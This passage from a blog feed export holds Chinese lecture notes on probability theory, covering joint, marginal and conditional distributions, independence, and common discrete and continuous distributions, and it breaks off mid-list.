f(x_1,x_2,\cdots,x_n):&amp;=P((X_1,X_2,\cdots,X_n)=(x_1,x_2,\cdots,x_n))\<br>  &amp;= P(X_1= x_1,X_2=x_2,\cdots,X_n=x_n).<br>  \end{aligned}<br>  $$</p></li><li><p><strong>注</strong>  $\sum\limits_{(x_1,\cdots,x_n)\in\mathbb{R}}f(x_1,\cdots,x_n)\equiv 1$.</p></li><li><p><strong>定义(多项分布)</strong>  若 $B_1, B_2\cdots,B_n$ 为互斥事件, 且 $\sum\limits_{i=1}^{n}B_i=\Omega$. 其发生的概率为 $p_1,\cdots,p_n$, 且 $\sum\limits_{i=1}^{n}p_i\equiv 1$. 满足<br>$$<br>P(X_1=k_1,\cdots,X_n=k_n)=\dfrac{N!}{k_1!\cdots k_n!}p_1^{k_1}\cdots p_n^{k_n},,k_i\ge 0,,\sum_{i=1}^{n}k_i=N.<br>$$<br>其中 $\dfrac{N!}{k_1!\cdots k_n!}$ 为多项式系数.</p></li></ul><h2 id="连续分布"><a href="#连续分布" class="headerlink" title="连续分布"></a>连续分布</h2><ul><li><p><strong>定义(联合 PDF)</strong>  若存在 $f(x_1,\cdots,x_n)\ge 0$, 使得 $\forall,Q\subset\mathbb{R}^n$ 可测, 都有<br>$$<br>P((X_1,\cdots,X_n)\in Q)=\int_Qf(x_1,\cdots,x_n)dx_1\cdots dx_n<br>$$<br>则称 $(X_1,\cdots,X_n)$ 为连续型, $f$ 为 $(X_1,\cdots,X_n)$ 的概率密度函数 <strong>(PDF)</strong>.</p></li><li><p><strong>注</strong></p><ul><li>$\int_{\mathbb{R}}f\equiv 1$;</li><li>以 $n=2$ 为例, $F(a,b)=\int_{-\infty}^{a}(\int_{-\infty}^{b}f(s,t)dt)ds$;</li><li>$f(a,b)=\dfrac{\partial^2 F}{\partial y\partial x}(a,b),,a.e$.</li></ul></li><li><p><strong>定义(连续分布)(矩形域)</strong><br>  $$<br>  f(x,y)=<br>  \begin{cases}<br>  \dfrac{1}{(b-a)(d-c)}, &amp;(x,y)\in(a,b)\times(c,d) \<br>  0, &amp;otherwise \<br>  \end{cases}<br>  $$</p></li><li><p><strong>定义(二元正态分布)</strong><br>  $$<br>  f(x,y)=\dfrac{1}{2\pi\sigma_1\sigma_2}\cdot\dfrac{1}{\sqrt{1-\rho^2}}e^{-\frac{1}{2(1-\rho^2)}[(\frac{x-\mu_1}{\sigma_1})^2+(\frac{y-\mu_2}{\sigma_2})^2-2\rho\frac{x-\mu_1}{\sigma_1}\frac{y-\mu_2}{\sigma_2}]},\<br>  $$<br>  其中 $(x,y)\in\mathbb{R}^2, \vert\rho\vert&lt;1$. </p><p>  上式中 $\exp$ 的指数可视为 $-\dfrac{1}{2}\overline{X}^TW\overline{X}=-\dfrac{1}{2}\overline{AX}^T\overline{AX}$, 其 <strong>Cholesky</strong> 分解为<br>  $$<br>  \overline{X}=\left(<br>  \begin{matrix}<br>  \dfrac{x-\mu_1}{\sigma_1}\<br>  \dfrac{y-\mu_2}{\sigma_2}<br>  \end{matrix}\right),<br>  W=\dfrac{1}{1-\rho^2}\left(<br>  \begin{matrix}<br>  1 &amp;-\rho\<br>  -\rho &amp;1<br>  \end{matrix}\right)\<br>  \Rightarrow<br>  A=\dfrac{1}{\sqrt{1-\rho^2}}\left(<br>  \begin{matrix}<br>  \pm 1 &amp;\mp\rho\<br>  0 &amp;\pm\sqrt{1-\rho^2}<br>  \end{matrix}\right).<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>$f(x,y)$ 的等值线图像为椭圆;</li><li>$\rho$ 的意义?</li></ul></li></ul><h2 id="边际分布"><a href="#边际分布" class="headerlink" title="边际分布"></a>边际分布</h2><ul><li><p><strong>定义(边际 CDF)</strong><br>  $$<br>  F_i(x) := P(X_i\le x) = P(X_i\le x,-\infty&lt;X_j&lt;\infty,(j\ne i)).<br>  $$</p></li><li><p><strong>连续型</strong></p><p>  $n=2$ 时</p><p>  $$<br>  F_X(x)=P(X\le x)=P(X\le x,-\infty&lt;Y&lt;\infty)=\lim_{y\rightarrow\infty}F(x,y).<br>  $$<br>  $n=3$ 时</p><p>  $$<br>  F_X(x)=P(X\le x,-\infty&lt;Y, Z&lt;\infty)=\lim_{y\rightarrow\infty,z\rightarrow\infty}F(x,y,z).<br>  $$</p><p>  $$<br>  F_{X,Y}(x,y)=P(X\le x,Y\le y,-\infty&lt;Z&lt;\infty)=\lim_{z\rightarrow\infty}F(x,y,z).<br>  $$</p></li><li><p><strong>离散型</strong></p><p>$n=2$ 时</p><p>$$<br>F_X(x)=P(X\le x)=\sum\limits_{a\le x}P(X=a)=\sum\limits_{y}\sum\limits_{a\le x}P(X=a,Y=y).<br>$$</p></li><li><p><strong>例(容斥原理)</strong><br>  $$<br>  P(X&gt;a,Y&gt;b)=1-F_X(a)-F_Y(b)+F_{X,Y}(a,b).<br>  $$</p></li><li><p><strong>定义(边际 PDF)</strong><br>  $$<br>  F_X(x) := P(X\le x) = \lim_{y\rightarrow\infty}F(x,y) = \int_{-\infty}^{x}(\int_{-\infty}^{\infty}f(s,t)dt)ds\<br>  $$<br>  $\Rightarrow X$ 的边际 <strong>PDF</strong> 为<br>  $$<br>  f_X(x)=\int_{-\infty}^{\infty}f(x,y)dy.<br>  $$</p></li><li><p><strong>例</strong>  二元正态分布 $N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$.</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>f_X(x)=\int_{-\infty}^{+\infty}f(x,y)dy=\dfrac{1}{\sqrt{2\pi}\sigma_1}e^{-\frac{(x-\mu_1)^2}{2\sigma_1^2}},,x\in\mathbb{R}.<br>\end{aligned}<br>$$<br>因此 $X\sim N(\mu_1,\sigma_1^2)$. 同理 $Y\sim N(\mu_2,\sigma_2^2)$.</p></li><li><p><strong>注</strong>  联合分布可确定边际分布, 边际分布不可确定联合分布.</p></li></ul><h2 id="条件分布-以-n-2-为例"><a href="#条件分布-以-n-2-为例" class="headerlink" title="条件分布 (以 $n=2$ 为例)"></a>条件分布 (以 $n=2$ 为例)</h2><ul><li><p><strong>定义(离散型条件分布)</strong>  $P(X=a_i,Y=b_j)=p_{ij}\ge 0$, $\sum\limits_{i,j}p_{ij}\equiv 1$.<br>$$<br>P(X=a_i\mid Y=b_j)=\dfrac{P(X=a_i,Y=b_j)}{P(Y=b_j)}=\dfrac{p_{ij}}{\sum\limits_{k}p_{kj}}.<br>$$</p></li><li><p><strong>注</strong>  $\sum\limits_{i}P(X=a_i\mid Y=b_j)\equiv 1$.</p></li><li><p><strong>定义(连续型条件分布)</strong>  $(X,Y)$ 的 <strong>PDF</strong> 为 $f(x,y)$.<br>$$<br>\begin{aligned}<br>P(X\le x\mid y\le Y\le y+dy)&amp;=\dfrac{P(X\le x, y\le Y\le y+dy)}{P(y\le Y\le y+dy)}\<br>&amp;=\dfrac{\int_{-\infty}^{x}(\int_{y}^{y+dy}f(s,t)dt)ds}{\int_{y}^{y+dy}f_Y(t)dt}.<br>\end{aligned}<br>$$</p></li><li><p><strong>定义(条件密度函数)</strong><br>  $$<br>  f_{X\mid Y}(x\mid y\le Y\le y+dy)=\dfrac{\int_{y}^{y+dy}f(x,t)dt}{\int_{y}^{y+dy}f_Y(t)dt}.<br>  $$<br>  令 $dy\rightarrow 0$, 定义条件密度函数:<br>  $$<br>  f_{X\mid Y}(x\mid y)=\dfrac{f(x,y)}{f_Y(y)}.<br>  $$<br>   条件密度函数 $f_{X\mid Y}(x\mid y)$ 为 <strong>PDF</strong>.</p></li><li><p><strong>注</strong></p><ul><li>$F(a\mid y)=P(X\le a\mid Y=y)=\int_{-\infty}^{a}f_{X\mid Y}(x\mid y)dx$;</li><li><strong>(乘法法则)</strong>  $f(x,y)=f_{X\mid Y}(x\mid y)f_Y(y)$;</li><li><strong>(全概率公式)</strong>  $f_X(x)=\int_{-\infty}^{\infty}f(x,y)dy=\int_{-\infty}^{\infty}f_{X\mid Y}(x\mid y)f_Y(y)dy$;</li><li><strong>(Bayes 公式)</strong>  $f_{Y\mid X}(y\mid x)=\dfrac{f(x,y)}{f_X(x)}=\dfrac{f_{X\mid Y}(x\mid y)f_Y(y)}{\int_{-\infty}^{\infty}f_{X\mid Y}(x\mid y)f_Y(y)dy}$.</li></ul></li><li><p><strong>例</strong>  二元正态分布.</p></li><li><p><strong>解答</strong>  注意到<br>$$<br>\begin{aligned}<br>f_{Y\mid X}(y\mid x)&amp;=\dfrac{f(x,y)}{f_X(x)}\<br>&amp;=\dfrac{1}{\sqrt{2\pi}\sigma_2}\cdot\dfrac{1}{\sqrt{1-\rho^2}}\cdot\exp{-\dfrac{[y-(\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(x-\mu_1))]^2}{2(1-\rho^2)\sigma_2^2}}.<br>\end{aligned}<br>$$<br>即当 $X=x$ 时, $Y\sim N(\mu_2+\rho\dfrac{\sigma_2}{\sigma_1}(x-\mu_1),(1-\rho^2)\sigma_2^2)$.</p></li></ul><h2 id="独立性"><a href="#独立性" class="headerlink" title="独立性"></a>独立性</h2><ul><li><p><strong>定义(独立性)</strong>  $(X,Y)$ 的 <strong>CDF</strong> 为 $F(x,y)$, 边际 <strong>CDF</strong> $F_X(x)$, $F_Y(y)$. 若<br>$$<br>F(x,y)=F_X(x)F_Y(y),,\forall,x,y\in\mathbb{R}.<br>$$<br>则称 $X,Y$ 相互独立.</p></li><li><p><strong>注</strong>  $X$, $Y$ 独立 $\Leftrightarrow f(x,y)=f_X(x)f_Y(y),,\forall,x,y\in\mathbb{R}$, 其中 $f$ 为 <strong>PDF/PMF</strong>.</p></li><li><p><strong>定义</strong>  $X_1,\cdots,X_n$ 相互独立 $\Leftrightarrow F(x_1,\cdots,x_n)=F_1(x_1)\cdots F_n(x_n),,\forall,x_1,\cdots,x_n\in\mathbb{R}.$</p></li><li><p><strong>注</strong>  $X_1,\cdots,X_n$ 独立 $\Leftrightarrow f(x_1,\cdots,x_n)=f_1(x_1)\cdots f_n(x_n),,\forall,x_1,\cdots,x_n\in\mathbb{R}$, 其中 $f$ 为 <strong>PDF/PMF</strong>.</p></li><li><p><strong>定理</strong></p><ul><li>$f(x_1,\cdots,x_n)=g_1(x_1)\cdots g_n(x_n),,\forall,x_1,\cdots,x_n\in\mathbb{R}$, 则 $X_1,\cdots,X_n$ 独立.</li><li>$X_1,\cdots,X_n$ 独立, $Y_1=g_1(X_1,\cdots,X_n), Y_2=g_2(X_1,\cdots,X_n)$, 则 $Y_1$, $Y_2$ 独立.</li></ul></li></ul><h2 id="随机向量的函数"><a href="#随机向量的函数" class="headerlink" title="随机向量的函数"></a>随机向量的函数</h2><ul><li><p><strong>定义</strong>  $Y=g(X_1,\cdots,X_n)$ </p></li><li><p><strong>例</strong>  $X_i\sim B(n_i, p),i=1,2$ 独立, $Y=X_1+X_2$.</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>P(Y=k)&amp;=P(X_1+X_2=k)=\sum_{j=0}^{k}P(X=j,X_2=k-j)\<br>&amp;=\sum_{j=0}^{k}P(X=j)P(X_2=k-j)\<br>&amp;=\sum_{j=0}^{k}C_{n_1}^{j}C_{n_2}^{k-j}p^k(1-p)^{n_1+n_2-k}\<br>&amp;=C_{n_1+n_2}^{k}p^k(1-p)^{n_1+n_2-k}.<br>\end{aligned}<br>$$<br>那么有 $Y\sim B(n_1+n_2,p).$</p></li><li><p><strong>例</strong>  $X_1,X_2$ 连续, $X_1&gt;0$, 其联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, 且 $Y=\dfrac{X_2}{X_1}$.</p></li><li><p><strong>解答</strong>  注意到 $\forall,y&gt;0$,<br>$$<br>\begin{aligned}<br>P(Y\le y)&amp;=P(\dfrac{X_2}{X_1}\le y)\<br>&amp;=P(X_2\le yX_1)\<br>&amp;=\int_{D}f(x_1,x_2)dx_1dx_2\<br>&amp;=\int_{0}^{\infty}(\int_{-\infty}^{yx_1}f(x_1,x_2)dx_2)dx_1\<br>&amp;=\int_{0}^{\infty}(\int_{-\infty}^{y}f(x_1,x_1t)x_1dt)dx_1.<br>\end{aligned}<br>$$<br>故 $Y$ 的 <strong>PDF</strong> 为<br>$$<br>l(y)=\int_{0}^{\infty}x_1f(x_1,x_1y)dx_1.<br>$$</p></li><li><p><strong>定义(密度函数变换法)</strong>  $X_1,X_2$ 的联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, $g_1,g_2$ 可微可逆, 满足<br>  $$<br>  \begin{cases}<br>  Y_1=g_1(X_1,X_2)\<br>  Y_2=g_2(X_1,X_2)<br>  \end{cases}\Rightarrow<br>  \begin{cases}<br>  X_1=h_1(Y_1,Y_2)\<br>  X_2=h_2(Y_1,Y_2)<br>  \end{cases}<br>  $$<br>  那么<br>  $$<br>  \begin{aligned}<br>  P((Y_1,Y_2)\in A)&amp;=P((X_1,X_2)\in B)\<br>  &amp;=\int_{B}f(x_1,x_2)dx_1dx_2\<br>  &amp;=\int_{A}f(h_1(y_1,y_2),h_2(y_1,y_2))\vert J\vert dy_1dy_2.<br>  \end{aligned}<br>  $$<br>  其中<br>  $$<br>  J=det\begin{pmatrix}<br>  \dfrac{\partial h_1}{\partial y_1},\dfrac{\partial h_1}{\partial y_2}\<br>  \dfrac{\partial h_2}{\partial y_1},\dfrac{\partial h_2}{\partial y_2}<br>  \end{pmatrix}<br>  $$<br>  故 $Y_1,Y_2$ 的 <strong>PDF</strong> 为<br>  $$<br>  l(y_1,y_2)=f(h_1(y_1,y_2),h_2(y_1,y_2))\vert J\vert.<br>  $$</p></li><li><p><strong>例</strong>  $X_1,X_2$ 连续, $X_1&gt;0$, 其联合 <strong>PDF</strong> 为 $f(x_1,x_2)$, 且 $Y=X_1+X_2$.</p></li><li><p><strong>解答</strong></p><p>令 $Z=X_1$, 则 $X_1=Z, X_2=Y-Z$. 故 $Y,Z$ 的 <strong>PDF</strong> 为<br>$$<br>l(y,z)=f(z,y-z)\vert J\vert=f(z,y-z).<br>$$<br>其中<br>$$<br>J=det\begin{pmatrix}<br>0,&amp;1\<br>1,&amp;-1<br>\end{pmatrix}<br>$$<br>那么 $Y$ 的 <strong>PDF</strong> 为<br>$$<br>l_Y(y)=\int_{-\infty}^{\infty}f(z,y-z)dz<br>$$</p></li><li><p><strong>注</strong></p><ul><li><p>若 $X_1,X_2$ 独立, 则</p><p>$$<br>l_Y(y)=\int_{-\infty}^{\infty}f_1(z)f_2(y-z)dz=f_1*f_2(y).<br>$$</p></li><li><p>若 $(X_1,X_2)\sim N(\mu_1,\mu_2,\sigma_1^2,\sigma_2^2,\rho)$, 则 </p><p>$$<br>Y=X_1+X_2\sim N(\mu_1+\mu_2,\sigma_1^2+\sigma_2^2+2\rho\sigma_1\sigma_2).<br>$$</p></li></ul></li><li><p><strong>注</strong>  三大分布: <strong>Chi-Square</strong> 分布 $\chi^2(n)$, $t_n$, $F$.</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记2</title>
      <link href="/47/"/>
      <url>/47/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-2-随机变量"><a href="#Chap-2-随机变量" class="headerlink" title="Chap 2 随机变量"></a>Chap 2 随机变量</h1><h2 id="1-维随机变量"><a href="#1-维随机变量" class="headerlink" title="1 维随机变量"></a>1 维随机变量</h2><ul><li><p><strong>定义(随机变量)</strong>  样本空间上的实值函数.<br>$$<br>X: \Omega\rightarrow\mathbb{R},,\omega\rightarrow X(\omega).<br>$$</p></li><li><p><strong>例</strong></p></li></ul><table><thead><tr><th align="center">试验</th><th align="center">样本空间</th><th align="center">随机变量</th><th align="center">像集 (新样本空间)</th></tr></thead><tbody><tr><td align="center">随机调查 $50$ 人对某议题支持与否</td><td align="center">${(1, 0, \cdots), \cdots}$</td><td align="center">$X_1= 1$ 的个数</td><td align="center">${0, 1, 2, \cdots, 50}$</td></tr><tr><td align="center">随机抽取一个北京市成年公民</td><td align="center">所有北京市成年公民之集</td><td align="center">$X_2=$ 其 $2022$ 年的收入</td><td align="center">$(-\infty, +\infty)$</td></tr></tbody></table><ul><li><p><strong>定义(事件)</strong>  $X_1 = 30$, $X_2&gt;100,000$.</p></li><li><p><strong>注</strong></p><ul><li>概括作用: 提供了试验结果的数值摘要;</li><li>事件 <strong>v.s.</strong> 变量, 静态 <strong>v.s.</strong> 动态.</li></ul></li><li><p><strong>分类</strong></p><ul><li>离散型: 至多可数个取值;</li><li>连续型: 区间型取值 (定义不严格);</li><li>其他.</li></ul></li><li><p><strong>定义</strong>  $\forall I\subset\mathbb{R}$, 令 $X^{-1}(I)$ 表示 $I$ 在 $X$ 下的原像集, $X^{-1}(I)\subset\Omega$, 例如<br>$$<br>X^{-1}((a, b)) = {\omega\in\Omega\mid a&lt;X(\omega)&lt;b}.<br>$$</p></li><li><p><strong>定义</strong><br>  $$<br>  P_{X}(X\in I) = P(X^{-1}(I)), ,\forall I\subset\mathbb{R},可测.<br>  $$<br>  需要 $X^{-1}(I)\in\mathscr{F}$, 一般记 $P_X$ 为 $P$.</p></li><li><p><strong>定义(累积分布函数)(CDF)</strong><br>  $$<br>  F(x) := P(X\le x), ,\forall x\in\mathbb{R}.<br>  $$<br>  我们有<br>  $$<br>  P(a&lt;X\le b)=F(b)-F(a).<br>  $$</p></li><li><p><strong>性质</strong></p><ul><li>$0\le F(x)\le 1$, 单调增(未必严格);</li><li>$\lim\limits_{x\rightarrow+\infty}F(x) = 1$, $\lim\limits_{x\rightarrow-\infty}F(x) = 0$;</li><li>右连续 ($PS.$ 若定义 $F(x) := P(X&lt;x)$, $\forall x\in\mathbb{R}$, 则有 $F(x)$ 左连续).</li></ul></li><li><p><strong>注</strong></p><ul><li><p>随机要素体现在样本点 $\omega$ 的不确定性;</p></li><li><p>随机变量的直观意义往往出现在样本空间的直观意义之前;</p></li></ul></li><li><p><strong>辨析</strong><br>  $$<br>  X_i=<br>  \begin{cases}<br>  1,,第i次抛硬币正面向上; \<br>  0,,第i次抛硬币正面向下. \<br>  \end{cases}<br>  $$<br>  其中 $i=1, 2$. 那么 $X_1 + X_2$ 的样本空间为<br>  $$<br>  {正正, 正反, 反正, 反反}.<br>  $$<br>  因为随机变量可视作函数, 需要满足定义域相同, 因此 $X_1$, $X_2$ 的定义域同上.</p></li><li><p><strong>注</strong></p><ul><li>$aX+bY$, $XY$, $\dfrac{X}{Y}(Y\ne 0)$, $g(X,Y)$ 为随机变量, 其中 $X$, $Y$ 样本空间相同;</li><li>需要有 $X^{-1}(I)\in\mathscr{F}$, 从而 $P(X^{-1}(I))$ 有意义.</li></ul></li><li><p><strong>定义(同分布)</strong>  $X_1, X_2$ 的 <strong>CDF</strong> 分别为 $F_1(x), F_2(x)$, 那么<br>  $$<br>  X_1, X_2 同分布\Leftrightarrow P(X_1^{-1}(I)) = P(X_2^{-1}(I)),\forall,I\subset\mathbb{R},可测\<br>  \Leftrightarrow F_1(x) = F_2(x),,\forall,x\in\mathbb{R}.<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>$X_1, X_2$ 同分布 $\nRightarrow X_1 = X_2$.</li><li>考虑掷一次硬币,  $X_1=$ 正面向上的次数, $X_2=$ 反面向上的次数, 这两个随机变量是同分布的.</li><li>随机变量是函数!</li></ul></li></ul><h2 id="离散型随机变量"><a href="#离散型随机变量" class="headerlink" title="离散型随机变量"></a>离散型随机变量</h2><ul><li><p><strong>定义(概率质量函数)(PMF)</strong><br>$$<br>f(x) = P(X = x),,\forall,x\in,\mathbb{R}.<br>$$</p></li><li><p><strong>注</strong></p><ul><li>$f(x_i)=p_i, \sum\limits_{i}P_i = 1$;</li><li><strong>CDF</strong> 为阶梯函数.</li></ul></li><li><p><strong>定义(期望与方差)</strong><br>  $$<br>  E(X) = \sum\limits_{i}x_ip_i = \sum\limits_{i}x_if(x_i) = \mu\<br>  Var(X) = \sum\limits_{i}(x_i-\mu)^2p_i = \sum\limits_{i}(x_i-\mu)^2f(x_i) = \sigma^2<br>  $$<br>  我们有<br>  $$<br>  Var(X) = E((X-E(X))^2) = E(X^2) - E^2(X).<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>算数均值即期望:</li></ul><p>$$<br>\dfrac{1}{n}\sum_{i = 1}^na_i=\dfrac{1}{n}\sum_{i = 1}^nk_ix_i=\sum_{i = 1}^np_ix_i=\mu;<br>$$</p><ul><li>期望存在 $\Leftrightarrow$ $\sum\limits_{i}\vert x_i\vert p_i&lt;+\infty$;</li><li>$E(g(X)) = \sum\limits_{i}g(x_i)p_i$;</li><li>$E(X), Var(X)$ 为随机变量 $X$ 的分布的特征, 分别刻画了随机变量的集中趋势和分散程度.</li></ul></li></ul><h2 id="常见离散分布"><a href="#常见离散分布" class="headerlink" title="常见离散分布"></a>常见离散分布</h2><ul><li><p><strong>定义(Bernoulli 分布)</strong><br>$$<br>X=<br>\begin{cases}<br>1,,事件成功,,p \<br>0,,事件不成功,,1-p \<br>\end{cases}<br>$$<br>记为 $X\sim B(p)$. 我们有<br>$$<br>E(X)=p, Var(X)=p(1-p).<br>$$</p></li><li><p><strong>定义(二项分布)</strong></p><p>  记 $X$ 为 $n$ 次独立 <strong>Bernoulli</strong> 试验的成功次数. 满足<br>  $$<br>  P(X=k)=C_n^kp^k(1-p)^{n-k},,k=0,1,\cdots,n.<br>  $$<br>  记为 $X\sim B(n,p)$. 我们有<br>  $$<br>  E(X)=np, Var(X)=np(1-p).<br>  $$</p></li><li><p><strong>定义(Poisson 分布)</strong></p><p>  满足<br>  $$<br>  P(X=k)=\dfrac{\lambda^k}{k!}e^{-\lambda},,k=0,1,2,\cdots.<br>  $$<br>  记为 $X\sim P(\lambda)$. 我们有<br>  $$<br>  E(X)=\lambda, Var(X)=\lambda.<br>  $$</p></li><li><p><strong>例</strong>  观察时间 $[0,1)$ 某路口发生的交通事故数 $X$.</p><ul><li><p>$l_i=[\dfrac{i-1}{n},\dfrac{i}{n}), i=1,2,\cdots,n$.</p></li><li><p>$n$ 充分大.</p></li><li><p>假设:</p><ul><li>$l_i$ 上至多发生一起事故;</li><li>$l_i$ 上恰发生一次事故的概率 $p=\dfrac{\lambda}{n}$, 与时长成正比;</li><li>$l_i$ 各段相互独立.</li></ul></li><li><p>此时<br>  $$<br>  \begin{aligned}<br>  P(X=k)&amp;=C_n^kp^k(1-p)^{n-k}\<br>  &amp;=\dfrac{n!}{k!(n-k)!}(\dfrac{\lambda}{n})^k(1-\dfrac{\lambda}{n})^{n-k}\<br>  &amp;\rightarrow\dfrac{\lambda^k}{k!}e^{-\lambda}, 当,n\to\infty.<br>  \end{aligned}<br>  $$</p></li></ul></li><li><p><strong>注</strong></p><ul><li>若 $X\sim B(n,p)$, $p$ 很小, $n$ 很大, $np$ 不太大, 则 $X\sim P(\lambda)$, $\lambda=np$.</li><li>误差最多为 $\min(p,np^2)$.</li><li><strong>Poisson</strong> 分布多用于一定时间或空间内小概率事件发生次数的场景.</li></ul></li><li><p><strong>例</strong>  某医院平均每小时出生婴儿 $\lambda$ 名, 接下来 $t$ 小时出生婴儿数的分布.</p></li><li><p><strong>解答</strong>  我们有<br>$$<br>P(N(t)=k)=\dfrac{(\lambda t)^k}{k!}e^{-\lambda t},,k=0,1,2,\cdots.<br>$$<br>其中 $\lambda$ 为均值.</p></li><li><p><strong>注</strong>  <strong>Bernoulli</strong> 试验不独立, 但弱相依条件下仍为较好近似.</p></li><li><p><strong>例(配对问题)</strong></p></li><li><p><strong>解答</strong>  弱相依条件下:<br>$$<br>P(A_i)=\dfrac{1}{n}\simeq P(A_i\mid A_j)=\dfrac{1}{n-1}<br>$$</p><p>恰有 $k$ 个人拿到自己的帽子的概率:<br>$$<br>P(X=k)=\dfrac{\lambda^k}{k!}e^{-\lambda}=\dfrac{e^{-1}}{k!}<br>$$</p></li><li><p><strong>常规解答</strong></p><p>  设 $E=$ 指定的 $k$ 个人拿到了自己的帽子.</p><p>  设 $F=$ 其余的 $n-k$ 个人未拿到自己的帽子.</p><p>  我们有:<br>  $$<br>  P(EF)=P(F\mid E)P(E)=P_{n-k}\dfrac{(n-k)!}{n!}<br>  $$<br>  进而有:<br>  $$<br>  P(X=k)=C_n^kP(EF)=\dfrac{1}{k!}P_{n-k}\rightarrow\dfrac{e^{-1}}{k!}.<br>  $$</p></li></ul><h2 id="连续随机变量"><a href="#连续随机变量" class="headerlink" title="连续随机变量"></a>连续随机变量</h2><ul><li><p><strong>定义(概率密度函数)(PDF)</strong>  若存在 $f\ge 0$, 使得 $\forall I\subset\mathbb{R}$ 可测, 都有<br>$$<br>P(X\in I)=\int_If(x)dx<br>$$<br>则称 $X$ 为连续型随机变量, $f$ 为 $X$ 的概率密度函数 <strong>(PDF)</strong>.</p></li><li><p><strong>性质</strong></p><ul><li>$\int_{-\infty}^{\infty}f(x)dx\equiv 1$;</li><li>$P(a&lt;X\le b)=\int_a^bf(x)dx=P(a\le X\le b)=P(a\le X&lt;b)=P(a&lt;X&lt;b)$;</li><li>$P(X=a)=0,\forall a\in\mathbb{R}$;</li><li>$P(x_0-\delta&lt;X\le x_0+\delta)=\int_{x_0-\delta}^{x_0+\delta}f(x)dx=2\delta f(x_0)$, 要求 $f$ 在 $x_0$ 处连续;</li><li>$F(x)=P(X\le x)=\int_{-\infty}^xf(t)dt$ 连续, $F’(x)=f(x)$ ($f$ 在 $x$ 处连续);</li><li><strong>PDF</strong> 与 <strong>PMF</strong> 实质上可以统一; <strong>PDF</strong> 若存在, 则不唯一.</li></ul></li><li><p><strong>定义(期望与方差)</strong><br>  $$<br>  E(X) = \int_{-\infty}^{\infty}xf(x)dx = \mu\<br>  Var(X) = \int_{-\infty}^{\infty}(x-\mu)^2f(x)dx = \sigma^2<br>  $$<br>  我们有<br>  $$<br>  Var(X) = E((X-E(X))^2) = E(X^2) - E^2(X).<br>  $$</p></li><li><p><strong>约定</strong>  $E(X)$ 存在 $\Leftrightarrow$ $E(X)&lt;\infty$.</p></li><li><p><strong>注</strong></p><ul><li>$E(X)$ 存在 $\Leftrightarrow$ $\int\limits_{-\infty}^{\infty}\vert x\vert f(x)dx&lt;\infty$;</li><li>一般地, $E(g(X))=\int\limits_{-\infty}^{\infty}g(x)f(x)dx$.</li></ul></li></ul><h2 id="常见连续分布"><a href="#常见连续分布" class="headerlink" title="常见连续分布"></a>常见连续分布</h2><ul><li><p><strong>定义(连续分布)</strong><br>$$<br>f(x)=<br>\begin{cases}<br>\dfrac{1}{b-a},,a&lt;x&lt;b \<br>0,,其他情况 \<br>\end{cases}<br>$$<br>记为 $X\sim U(a,b)$. 我们有<br>$$<br>E(X)=\dfrac{a+b}{2}, Var(X)=?.<br>$$</p></li><li><p><strong>注</strong>  $X\sim U(0,1)$ 称为随机数.</p></li><li><p><strong>定义(正态分布)</strong><br>  $$<br>  f(x)=\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\dfrac{(x-\mu)^2}{2\sigma^2}},,x\in\mathbb{R}.<br>  $$<br>  记为 $X\sim N(\mu,\sigma^2)$. 我们有<br>  $$<br>  E(X)=\mu, Var(X)=\sigma^2.<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>$X\sim N(\mu,\sigma^2)\Leftrightarrow Y=\dfrac{X-\mu}{\sigma}\sim N(0,1)$;</li><li>$N(0,1)$ 标准正态;</li><li>经验法则.</li></ul></li><li><p><strong>定义(指数分布)</strong><br>  $$<br>  f(x)=<br>  \begin{cases}<br>  \lambda e^{-\lambda x},,x&gt;0 \<br>  0,,x\le 0 \<br>  \end{cases}<br>  $$<br>  记为 $X\sim Exp(\lambda)$. 我们有<br>  $$<br>  E(X)=\dfrac{1}{\lambda}, Var(X)=\dfrac{1}{\lambda^2}.<br>  $$</p></li><li><p><strong>注</strong></p><ul><li>有的软件取参数为 $\beta=\dfrac{1}{\lambda}$;</li><li>通常刻画寿命或等待时间.</li></ul></li><li><p><strong>例</strong>  观察到有婴儿出生, 接下来 $t$ 小时有婴儿出生的概率为?</p></li><li><p><strong>解答</strong><br>$$<br>\begin{aligned}<br>P(X\le t)&amp;=1-P(X&gt;t)\<br>&amp;=1-P(N(t)=0)\<br>&amp;=1-\dfrac{(\lambda t)^0}{0!}e^{-\lambda t}\<br>&amp;=1-e^{-\lambda t}.<br>\end{aligned}<br>$$<br>这是一个 <strong>Poisson</strong> 过程, 数量是 <strong>Poisson</strong> 分布, 间隔是指数分布.</p></li><li><p><strong>定义</strong>  假设 $X&gt;0$ 连续, 其 <strong>CDF</strong> 为 $F(x)$, 满足 $F(0)=0$. 考虑<br>$$<br>\begin{aligned}<br>&amp;P(x&lt;X&lt;x+dx\mid X&gt;x)\<br>=&amp;\dfrac{P(x&lt;X&lt;x+dx)}{P(X&gt;x)}\<br>=&amp;\dfrac{F(x+dx)-F(x)}{1-F(x)}\<br>\approx&amp;\dfrac{F’(x)}{1-F(x)}dx.<br>\end{aligned}<br>$$</p><p>视为年龄为 $x$ 的元件失效的条件概率密度 (瞬时失效率/危险率).</p></li><li><p><strong>注</strong></p><ul><li><p>令 $\dfrac{F’(x)}{1-F(x)}=\lambda(x)\Rightarrow F(x)=1-e^{-\int_0^x\lambda(t)dt},x&gt;0$;</p></li><li><p>若 $\lambda(x)\equiv\lambda,(无老化假设)$, 则 $F(x)=1-e^{-\lambda x}$,</p><p>$\Rightarrow P(X&gt;t+s\mid X&gt;s)=\dfrac{P(X&gt;t+s)}{P(X&gt;s)}=\dfrac{1-F(s+t)}{1-F(s)}=e^{-\lambda t}$  $(无记忆性)$;</p></li><li><p>改进 